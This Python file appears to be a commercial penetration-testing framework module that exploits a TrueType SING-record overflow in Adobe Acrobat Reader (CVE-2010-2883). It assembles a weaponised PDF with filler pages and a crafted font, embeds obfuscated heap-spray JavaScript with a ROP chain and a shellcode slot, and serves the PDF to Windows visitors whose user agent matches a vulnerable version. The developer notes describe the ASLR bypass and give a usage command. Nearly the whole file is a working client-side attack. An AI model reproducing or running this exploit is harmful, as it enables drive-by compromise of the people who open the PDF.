#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  acrobat_ttf_golfclinic.py
## Description:
##            :
## Created_On :  Wed Sep  8 10:25:57 2010
## Created_By :  Kostya Kortchinsky
## Modified_On:  Mon Sep 13 16:29:30 2010
## Modified_By:  Kostya Kortchinsky
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.ua_parser import user_agent_parser

NAME="Acrobat Reader TTF Bug"
DESCRIPTION='Adobe Acrobat Reader TTF Bug'

DOCUMENTATION={}
DOCUMENTATION['Date public']='09/08/2010'
DOCUMENTATION['References']='http://contagiodump.blogspot.com/2010/09/cve-david-leadbetters-one-point-lesson.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Acrobat Reader <= 9.3.4'
DOCUMENTATION['CVE Name']='CVE-2010-2883'
DOCUMENTATION['CVE Url']=''
DOCUMENTATION['Notes']=''

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]

PROPERTY['VENDOR']='Adobe'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Fairly interesting tricks in this exploit. One is the use of addresses in
icucnv36.dll that hasn't changed with updates of Reader and is not covered by
ASLR.

This DLL is not loaded by default when opening a PDF, but with a PDF form
(submit button?) being displayed only.
The issue here is that if the TTF bug is triggered immediately, the form is not
displayed and the DLL is not loaded.

So the document has to be carefully crafted to trigger the desired behavior.
The first page will contain the PDF form/button. The next 10 or so pages will
not contain anything of importance but have to be there so that the loading of
the last page is delayed.

The last page will contain the crafted TTF font with the invalid SING record.

Since we don't really want a user to scroll all the way down to the last page,
a JavaScript script is included in the first page that will navigate to the last
page of the document.

Usage:
./exploits/httpserver/httpserver.py -O singleexploit:acrobat_ttf_sing -l 192.168.2.101 -p 8080 -d 5555
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0]
}

from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion=None
        self.badstring='\0\xff'
        self.name=NAME
        self.htmlfilename='file.html'
        from engine.config import canvas_root_directory
        self.local_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.form_pdf=os.path.join(self.local_path,'blank_form.pdf')
        self.font_pdf=os.path.join(self.local_path,'blank_font.pdf')
        self.sing_ttf=os.path.join(self.local_path,'sing.ttf')
        self.blank_pdf='Resources/blank.pdf'
        self.dest_pdf='temp.pdf'
        self.HTTPMOSDEF=False
        return

    def is_vulnerable( self, info_dict ):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])
        if 'Windows' not in parsed['os']['family']:
            return 0

        major,minor,build,patch=self.getReaderVersions(info_dict)
        if not major:
            #no Reader
            return 0
        if major==9:
            if minor<=3:
                if build<=4:
                    return 80
        return 0

    def makePDF(self):
        formPdf=PdfFileReader(file(self.form_pdf,'rb'))
        blankPdf=PdfFileReader(file(self.blank_pdf,'rb'))
        fontPdf=PdfFileReader(file(self.font_pdf,'rb'))
        binaryFont=file(self.sing_ttf,'rb').read()

        ff2=StreamObject()
        ff2._data=binaryFont
        ff2=ff2.flateEncode()
        ff2[NameObject('/Length1')]=NumberObject(len(binaryFont))

        destPdf=PdfFileWriter()
        destPdf._header='%PDF-1.4'
        r=destPdf._root.getObject()
        #ugly bunch of hacks
        r.update({NameObject('/AcroForm'):formPdf.trailer['/Root']['/AcroForm'].getObject()})
        r.update({NameObject('/OpenAction'):formPdf.trailer['/Root']['/OpenAction'].getObject()})
        r.update({NameObject('/Lang'):createStringObject('en-US')})
        p=formPdf.trailer['/Root']['/OpenAction'][0].getObject()
        oldPages=p['/Parent'].getObject()
        newPages=destPdf._pages.getObject()
        newPages.update(oldPages)
        for i in range(10):
            p=blankPdf.getPage(0)
            destPdf.addPage(p)
        p=fontPdf.getPage(0)
        destPdf.addPage(p)
        p['/Resources']['/Font']['/F1']['/FontDescriptor'][NameObject('/FontFile2')]=ff2

        #now the JavaScript
        p=newPages['/Kids'][0].getObject() #1st page
        p[NameObject('/AA')]=DictionaryObject()
        p['/AA'].update({NameObject('/O'):DictionaryObject()})
        js=StreamObject()
        #this was taken from the public exploit PDF
        code="""var Juaidai = 12;
var Tolbqnpp = "";

function Vnyhayduv(Gklcbtj,times){
 Ipugpqlbvtw = ""
 var Otdwcwgpeznj;
 var Juaidai = 723;
 for (Otdwcwgpeznj=0;Otdwcwgpeznj<times;Otdwcwgpeznj++){
 Juaidai = 1;
 Ipugpqlbvtw = Ipugpqlbvtw + Gklcbtj;
 }
 return Ipugpqlbvtw;
}

function Oovachwigu(Jxapyyyksdkd){
 var Juaidai = 12;
 return unescape(Jxapyyyksdkd);
}


var Pimfmtggbh = Tolbqnpp+"&%!".charAt(1)+Tolbqnpp;
Pimfmtggbh = Tolbqnpp + Pimfmtggbh + Tolbqnpp+"u"+Tolbqnpp;

var Enchfcuvtwn = (app.viewerVersion / 10.0);
Vbiiclkvlyyl = "SHELLCODE";
var Ycjygwhscgnv = this;
Vbiiclkvlyyl = Oovachwigu(Vbiiclkvlyyl);

function Htbcdm(Vbiiclkvlyyl,Bzubmlxlbf,Bkesxwjtsb){
 var Olalun = 1024;

 var Saqytin = Vnyhayduv(Bzubmlxlbf,Olalun);
 var Uipcwelcwl = Vnyhayduv(Bzubmlxlbf,Olalun-(Vbiiclkvlyyl.length/2))+Vbiiclkvlyyl;

 var FvzlbcjckcfOfFirstEntry = Vnyhayduv(Bzubmlxlbf,Olalun-18);
 var FvzlbcjckcfOfOtherEntry = Vnyhayduv(Bzubmlxlbf,Olalun-11);

 var Vxcuul = [];
 for( Otdwcwgpeznj = 0; Otdwcwgpeznj < 16-2; Otdwcwgpeznj++ ){
 Vxcuul.push( Saqytin );
 }
 Vxcuul.push(Uipcwelcwl);
 var Lvxgmunsmebw = Vxcuul.join("");

 Ycjygwhscgnv.Hpedba = new Array();
 var Wafaue = 0;
 for( Otdwcwgpeznj = 0; Otdwcwgpeznj < Bkesxwjtsb; Otdwcwgpeznj++ ){
 if (Otdwcwgpeznj == 0){
 Ycjygwhscgnv.Hpedba[Otdwcwgpeznj] = FvzlbcjckcfOfFirstEntry+Lvxgmunsmebw;
 } else{
 Ycjygwhscgnv.Hpedba[Otdwcwgpeznj] = FvzlbcjckcfOfOtherEntry+Lvxgmunsmebw;
 }
 }
}


Uzwnncyhd = "M4142M4241";
Uzwnncyhd = Uzwnncyhd.replace(/M/g,Pimfmtggbh);
Uzwnncyhd = Oovachwigu(Uzwnncyhd);


if ( app.platform == "WIN" ){
 if ( Enchfcuvtwn <= 0.8999999999 ) {
 app.alert("Please update your PDF viewer software.");
 } else if ( Enchfcuvtwn <= 0.9999999999 ) {
 Nircgsipef = "";
Nircgsipef = Nircgsipef +"M63a5M4a80M0000M4a8aM2196M4";
Nircgsipef = Nircgsipef +"a80M1f90M4a80M903cM4a84Mb69";
Nircgsipef = Nircgsipef +"2M4a80M1064M4a80M22c8M4a85M";
Nircgsipef = Nircgsipef +"0000M1000M0000M0000M0000M00";
Nircgsipef = Nircgsipef +"00M0002M0000M0102M0000M0000";
Nircgsipef = Nircgsipef +"M0000M63a5M4a80M1064M4a80M2";
Nircgsipef = Nircgsipef +"db2M4a84M2ab1M4a80M0008M000";
Nircgsipef = Nircgsipef +"0Ma8a6M4a80M1f90M4a80M9038M";
Nircgsipef = Nircgsipef +"4a84Mb692M4a80M1064M4a80Mff";
Nircgsipef = Nircgsipef +"ffMffffM0000M0000M0040M0000";
Nircgsipef = Nircgsipef +"M0000M0000M0000M0001M0000M0";
Nircgsipef = Nircgsipef +"000M63a5M4a80M1064M4a80M2db";
Nircgsipef = Nircgsipef +"2M4a84M2ab1M4a80M0008M0000M";
Nircgsipef = Nircgsipef +"a8a6M4a80M1f90M4a80M9030M4a";
Nircgsipef = Nircgsipef +"84Mb692M4a80M1064M4a80Mffff";
Nircgsipef = Nircgsipef +"MffffM0022M0000M0000M0000M0";
Nircgsipef = Nircgsipef +"000M0000M0000M0001M63a5M4a8";
Nircgsipef = Nircgsipef +"0M0004M4a8aM2196M4a80M63a5M";
Nircgsipef = Nircgsipef +"4a80M1064M4a80M2db2M4a84M2a";
Nircgsipef = Nircgsipef +"b1M4a80M0030M0000Ma8a6M4a80";
Nircgsipef = Nircgsipef +"M1f90M4a80M0004M4a8aMa7d8M4";
Nircgsipef = Nircgsipef +"a80M63a5M4a80M1064M4a80M2db";
Nircgsipef = Nircgsipef +"2M4a84M2ab1M4a80M0020M0000M";
Nircgsipef = Nircgsipef +"a8a6M4a80M63a5M4a80M1064M4a";
Nircgsipef = Nircgsipef +"80MaedcM4a80M1f90M4a80M0034";
Nircgsipef = Nircgsipef +"M0000Md585M4a80M63a5M4a80M1";
Nircgsipef = Nircgsipef +"064M4a80M2db2M4a84M2ab1M4a8";
Nircgsipef = Nircgsipef +"0M000aM0000Ma8a6M4a80M1f90M";
Nircgsipef = Nircgsipef +"4a80M9170M4a84Mb692M4a80Mff";
Nircgsipef = Nircgsipef +"ffMffffMffffMffffMffffMffff";
Nircgsipef = Nircgsipef +"M1000M0000M258bM0000M4a8aM4";
Nircgsipef = Nircgsipef +"d4d";

 Nircgsipef = Nircgsipef.replace(/M/g,Pimfmtggbh);
 Nircgsipef = Oovachwigu(Nircgsipef);
 Zxwhjjr = "";
Zxwhjjr = Zxwhjjr +"M1064M4a80";

 Zxwhjjr = Zxwhjjr.replace(/M/g,Pimfmtggbh);
 Zxwhjjr = Oovachwigu(Zxwhjjr);

 Htbcdm(Nircgsipef + Vbiiclkvlyyl,Zxwhjjr,2000);

 var t = app.setTimeOut("this.pageNum = LASTPAGE",4000); //Goes to the last page after 4s.

 } else{
 app.alert("Please update your PDF viewer software.");
 }
}else{
 app.alert("Please update your PDF viewer software.");
}
""".replace('LASTPAGE','%d'%(newPages['/Count'])).replace('SHELLCODE',urluencode('AAAA'+self.shellcode))
        js._data=code
        p['/AA']['/O'][NameObject('/S')]=NameObject('/JavaScript')
        p['/AA']['/O'][NameObject('/JS')]=js.flateEncode()

        f=file(self.dest_pdf,'wb')
        destPdf.write(f)
        f.close()
        return file(self.dest_pdf,'rb').read()

    def makeHTML(self):
        webpage="<HTML><BODY>\n"
        webpage+="<IFRAME src=\"%s\" frameborder=0 scrolling=no width=100%% height=100%%></IFRAME>\n"%(self.dest_pdf)
        webpage+="</BODY></HTML>\n"
        return webpage

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            h.addHeader('Content-Type','application/pdf')
            self.createShellcode()
            b.setBody(self.makePDF())
        else:
            self.log('Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        #self.source_pdf=self.argsDict.get('source_filename',self.source_pdf)
        self.dest_pdf=self.argsDict.get('dest_filename', self.dest_pdf)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        self.filedata=self.makePDF()
        self.log('Opening %s for output'%(self.dest_pdf))
        fd=file(self.dest_pdf,'wb+')
        fd.write(self.filedata)
        fd.close()
        self.log('Wrote to %s'%(self.dest_pdf))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
